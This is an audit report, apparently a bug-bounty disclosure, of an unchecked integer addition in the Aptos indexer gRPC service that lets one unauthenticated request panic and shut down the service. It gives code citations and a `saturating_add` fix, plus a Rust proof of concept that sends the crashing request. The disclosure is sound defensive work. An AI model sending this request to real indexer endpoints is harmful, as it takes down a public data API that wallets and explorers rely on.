# Audit Report

## Title
Integer Overflow Panic in Indexer gRPC Service Causes Complete Service Shutdown

## Summary
The indexer gRPC data service contains an unchecked integer addition when calculating the ending version from `starting_version + transactions_count`. With overflow-checks enabled in release mode, an attacker can trigger a panic that crashes the entire service by sending requests with values that sum beyond `u64::MAX`.

## Finding Description
The `GetTransactionsRequest` processing in both the live and historical data services performs unchecked integer addition to calculate the ending version. When an attacker specifies `starting_version` close to `u64::MAX` and a large `transactions_count`, the addition overflows. [1](#0-0) [2](#0-1) 

Since the Aptos codebase enables overflow-checks in release builds, this overflow triggers a panic: [3](#0-2) 

The panic occurs in the main request handler loop before spawning the streaming task. This causes the entire `run()` function to panic, which terminates the `spawn_blocking` task: [4](#0-3) 

The failed task is awaited by `try_join_all`, causing the entire service to shut down: [5](#0-4) 

The indexer gRPC service is a public-facing API accessible without authentication: [6](#0-5) 

Notably, the `localnet_data_service` implementation correctly uses `saturating_add` to prevent this issue: [7](#0-6) 

## Impact Explanation
This qualifies as **High Severity** under the Aptos bug bounty criteria due to "API crashes". A single malicious gRPC request causes the entire indexer data service to terminate, requiring manual restart. This affects all clients (explorers, wallets, analytics platforms) that depend on the indexer for blockchain data access. While this doesn't impact consensus or validator operations, it causes complete loss of data access availability for the public API.

## Likelihood Explanation
**High likelihood**. The attack requires only:
- Sending a single unauthenticated gRPC request
- Setting `starting_version = u64::MAX - 100` (or any high value)
- Setting `transactions_count = 1000` (or any value causing overflow)

No special privileges, timing, or system state manipulation is required. The service crash is deterministic and immediately reproducible.

## Recommendation
Replace unchecked addition with `saturating_add` in both vulnerable locations, matching the safe pattern already used in `localnet_data_service.rs`:

```rust
// In live_data_service/mod.rs line 123-125
let ending_version = request
    .transactions_count
    .map(|count| starting_version.saturating_add(count));

// In historical_data_service.rs line 108-110  
let ending_version = request
    .transactions_count
    .map(|count| starting_version.saturating_add(count));
```

## Proof of Concept

```rust
// PoC: Send malicious gRPC request to crash the service
use aptos_protos::indexer::v1::{GetTransactionsRequest, raw_data_client::RawDataClient};

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let channel = tonic::transport::Channel::from_static("http://[INDEXER_SERVICE]:50051")
        .connect()
        .await?;
    
    let mut client = RawDataClient::new(channel);
    
    // Craft malicious request that triggers overflow
    let request = GetTransactionsRequest {
        starting_version: Some(u64::MAX - 100),
        transactions_count: Some(1000),  // Causes overflow when added
        batch_size: None,
        transaction_filter: None,
    };
    
    // Send request - service will panic and shut down
    let _ = client.get_transactions(request).await;
    
    println!("Attack sent - indexer service should now be crashed");
    Ok(())
}
```

## Notes
While this vulnerability is in the indexer service (not core consensus/execution), it represents a critical availability issue for the public-facing data access layer. The inconsistency between using `saturating_add` in `localnet_data_service` but unchecked addition in the production services indicates this is a defensive programming gap that should be addressed.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L123-125)
```rust
                let ending_version = request
                    .transactions_count
                    .map(|count| starting_version + count);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/historical_data_service.rs (L108-110)
```rust
                let ending_version = request
                    .transactions_count
                    .map(|count| starting_version + count);
```

**File:** Cargo.toml (L921-923)
```text
[profile.release]
debug = true
overflow-checks = true
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L140-152)
```rust
        tasks.push(tokio::task::spawn_blocking(move || {
            LIVE_DATA_SERVICE
                .get_or_init(|| {
                    LiveDataService::new(
                        chain_id,
                        config,
                        connection_manager,
                        max_transaction_filter_size_bytes,
                    )
                })
                .run(handler_rx);
            Ok(())
        }));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L281-281)
```rust
        futures::future::try_join_all(tasks).await?;
```

**File:** protos/proto/aptos/indexer/v1/raw_data.proto (L1-30)
```text
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

syntax = "proto3";

package aptos.indexer.v1;

import "aptos/indexer/v1/filter.proto";
import "aptos/transaction/v1/transaction.proto";

// This is for storage only.
message TransactionsInStorage {
  // Required; transactions data.
  repeated aptos.transaction.v1.Transaction transactions = 1;
  // Required; chain id.
  optional uint64 starting_version = 2;
}

message GetTransactionsRequest {
  // Required; start version of current stream.
  optional uint64 starting_version = 1 [jstype = JS_STRING];

  // Optional; number of transactions to return in current stream.
  // If not present, return an infinite stream of transactions.
  optional uint64 transactions_count = 2 [jstype = JS_STRING];

  // Optional; number of transactions in each `TransactionsResponse` for current stream.
  // If not present, default to 1000. If larger than 1000, request will be rejected.
  optional uint64 batch_size = 3;

```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/localnet_data_service.rs (L51-55)
```rust
        let ending_version = if let Some(count) = r.transactions_count {
            starting_version.saturating_add(count)
        } else {
            u64::MAX
        };
```
